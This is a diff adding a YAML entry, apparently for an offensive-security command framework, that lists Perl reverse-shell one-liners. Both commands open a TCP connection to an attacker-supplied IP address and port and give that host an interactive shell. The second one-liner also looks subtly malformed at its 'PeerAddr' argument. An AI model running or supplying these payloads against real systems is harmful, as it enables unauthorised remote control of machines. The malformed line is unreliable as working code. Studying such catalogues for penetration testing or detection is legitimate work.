@@ -1,0 +1,22 @@
+---
+name: perl
+description: The Perl language interpreter
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Reverse Shell (/bin/sh)":
+    - type: ["other","NX"]
+    - text: "perl -e 'use Socket;$i=\"{IPV4}\";$p={INT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Reverse Shell, /bin/sh Disabled":
+    - type: ["other","NX"]
+    - text: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr\"{IPV4}:{INT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
